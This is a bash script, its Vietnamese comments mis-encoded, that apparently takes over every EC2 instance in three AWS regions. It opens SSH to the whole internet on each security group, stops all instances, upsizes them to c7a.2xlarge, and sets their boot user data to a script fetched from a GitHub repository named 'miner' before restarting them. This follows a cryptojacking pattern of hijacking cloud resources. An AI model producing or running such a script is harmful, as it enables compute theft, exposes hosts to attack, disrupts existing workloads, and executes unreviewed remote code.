#!/bin/bash

# Ki·ªÉm tra n·∫øu kh√¥ng ch·∫°y v·ªõi quy·ªÅn root th√¨ t·ª± ƒë·ªông chuy·ªÉn sang root
if [[ $EUID -ne 0 ]]; then
    echo "‚ö†Ô∏è Script ch∆∞a ch·∫°y v·ªõi quy·ªÅn root. Chuy·ªÉn sang root..."
    exec sudo bash "$0" "$@"
fi

# URL ch·ª©a User Data tr√™n GitHub
USER_DATA_URL="https://raw.githubusercontent.com/hieudv194/miner/refs/heads/main/viauto"

# File t·∫°m ƒë·ªÉ l∆∞u User Data
USER_DATA_FILE="/tmp/user_data.sh"

# Danh s√°ch v√πng AWS c·∫ßn thay ƒë·ªïi instance
REGIONS=("us-east-1" "us-west-2" "us-east-2")

# T√™n Key Pair
KEY_NAME="MyKey"
KEY_FILE="${KEY_NAME}.pem"

# T·∫°o Key Pair n·∫øu ch∆∞a c√≥
if [ ! -f "$KEY_FILE" ]; then
    echo "üîë T·∫°o Key Pair AWS: $KEY_NAME..."
    aws ec2 create-key-pair --key-name "$KEY_NAME" --query 'KeyMaterial' --output text > "$KEY_FILE"
    chmod 600 "$KEY_FILE"
    echo "‚úÖ Key Pair $KEY_NAME ƒë√£ ƒë∆∞·ª£c t·∫°o v√† l∆∞u t·∫°i $KEY_FILE."
else
    echo "‚úÖ Key Pair $KEY_NAME ƒë√£ t·ªìn t·∫°i."
fi

# H√†m ki·ªÉm tra v√† m·ªü c·ªïng SSH (22) n·∫øu b·ªã ch·∫∑n
ensure_ssh_open() {
    local sg_id="$1"
    local region="$2"

    if ! aws ec2 describe-security-group-rules --region "$region" \
        --filters Name=group-id,Values="$sg_id" Name=ip-permission.from-port,Values=22 \
                  Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
        echo "üîì M·ªü c·ªïng SSH (22) trong Security Group $sg_id..."
        aws ec2 authorize-security-group-ingress --group-id "$sg_id" --protocol tcp \
            --port 22 --cidr 0.0.0.0/0 --region "$region"
    else
        echo "‚úÖ C·ªïng SSH (22) ƒë√£ ƒë∆∞·ª£c m·ªü."
    fi
}

# H√†m x√°c ƒë·ªãnh ki·ªÉu m√°y m·ªõi
get_new_instance_type() {
    case "$1" in
        "c7a.large") echo "c7a.2xlarge" ;;
        *) echo "c7a.2xlarge" ;; # M·∫∑c ƒë·ªãnh n·∫øu kh√¥ng x√°c ƒë·ªãnh ƒë∆∞·ª£c
    esac
}

# T·∫£i User Data t·ª´ GitHub v√† m√£ h√≥a th√†nh Base64
download_and_encode_user_data() {
    echo "üì• ƒêang t·∫£i User Data t·ª´ GitHub..."
    curl -s -L "$USER_DATA_URL" -o "$USER_DATA_FILE"

    # Ki·ªÉm tra n·∫øu file t·ªìn t·∫°i v√† kh√¥ng r·ªóng
    if [ ! -s "$USER_DATA_FILE" ]; then
        echo "‚ùå L·ªói: Kh√¥ng t·∫£i ƒë∆∞·ª£c User Data t·ª´ GitHub."
        exit 1
    fi

    # Ki·ªÉm tra User Data c√≥ ch·∫°y ƒë∆∞·ª£c kh√¥ng
    if ! bash -n "$USER_DATA_FILE"; then
        echo "‚ùå L·ªói: User Data kh√¥ng h·ª£p l·ªá khi ch·∫°y v·ªõi bash."
        exit 1
    fi

    echo "‚úÖ User Data h·ª£p l·ªá."
    base64 -w 0 "$USER_DATA_FILE"
}

# L·∫∑p qua t·ª´ng v√πng ƒë·ªÉ ki·ªÉm tra v√† x·ª≠ l√Ω
for REGION in "${REGIONS[@]}"; do
    echo "üîπ ƒêang x·ª≠ l√Ω v√πng: $REGION"

    # L·∫•y danh s√°ch Instance ID v√† Security Group ID trong v√πng
    INSTANCE_INFO=$(aws ec2 describe-instances --region "$REGION" \
        --query "Reservations[*].Instances[*].[InstanceId,InstanceType,SecurityGroups[0].GroupId]" --output text)

    if [ -z "$INSTANCE_INFO" ]; then
        echo "‚ö†Ô∏è Kh√¥ng c√≥ instance n√†o trong v√πng $REGION."
        continue
    fi

    INSTANCE_IDS=($(echo "$INSTANCE_INFO" | awk '{print $1}'))
    INSTANCE_TYPES=($(echo "$INSTANCE_INFO" | awk '{print $2}'))
    SECURITY_GROUP_IDS=($(echo "$INSTANCE_INFO" | awk '{print $3}'))

    # ƒê·∫£m b·∫£o m·ªü c·ªïng SSH cho t·ª´ng Security Group
    for SG_ID in "${SECURITY_GROUP_IDS[@]}"; do
        ensure_ssh_open "$SG_ID" "$REGION"
    done

    # D·ª´ng t·∫•t c·∫£ instances
    echo "üõë D·ª´ng t·∫•t c·∫£ instances trong v√πng $REGION..."
    aws ec2 stop-instances --instance-ids "${INSTANCE_IDS[@]}" --region "$REGION"
    aws ec2 wait instance-stopped --instance-ids "${INSTANCE_IDS[@]}" --region "$REGION"

    # Thay ƒë·ªïi ki·ªÉu m√°y
    for ((i = 0; i < ${#INSTANCE_IDS[@]}; i++)); do
        INSTANCE_ID=${INSTANCE_IDS[i]}
        CURRENT_TYPE=${INSTANCE_TYPES[i]}
        NEW_TYPE=$(get_new_instance_type "$CURRENT_TYPE")

        echo "üîÑ ƒê·ªïi instance $INSTANCE_ID t·ª´ $CURRENT_TYPE ‚ûù $NEW_TYPE"
        aws ec2 modify-instance-attribute --instance-id "$INSTANCE_ID" \
            --instance-type "{\"Value\": \"$NEW_TYPE\"}" --region "$REGION"
    done

    # T·∫£i v√† m√£ h√≥a User Data
    USER_DATA_BASE64=$(download_and_encode_user_data)

    # C·∫≠p nh·∫≠t User Data
    for INSTANCE in "${INSTANCE_IDS[@]}"; do
        echo "üìù C·∫≠p nh·∫≠t User Data cho instance $INSTANCE..."
        aws ec2 modify-instance-attribute --instance-id "$INSTANCE" \
            --user-data "Value=$USER_DATA_BASE64" --region "$REGION"
    done

    # Kh·ªüi ƒë·ªông l·∫°i instances
    echo "üöÄ Kh·ªüi ƒë·ªông l·∫°i t·∫•t c·∫£ instances trong v√πng $REGION..."
    aws ec2 start-instances --instance-ids "${INSTANCE_IDS[@]}" --region "$REGION"
done

echo "‚úÖ Ho√†n t·∫•t thay ƒë·ªïi ki·ªÉu m√°y & c·∫≠p nh·∫≠t User Data!"
